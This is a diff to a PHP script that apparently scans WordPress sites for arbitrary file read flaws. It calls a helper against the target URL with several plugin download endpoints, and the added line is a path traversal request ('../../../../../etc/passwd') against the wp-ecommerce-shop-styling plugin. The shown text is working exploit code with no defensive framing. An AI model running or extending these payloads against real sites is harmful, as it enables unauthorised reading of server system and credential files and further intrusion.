@@ -269,6 +269,7 @@ __request($argv[1], '/?action=cpis_init&cpis-action=f-download&purchase_id=1&cpi
 
 __request($argv[1], '/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd');
 
+__request($argv[1], '/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../../../../../../etc/passwd');
 
 function __request($url, $plugin) {
 
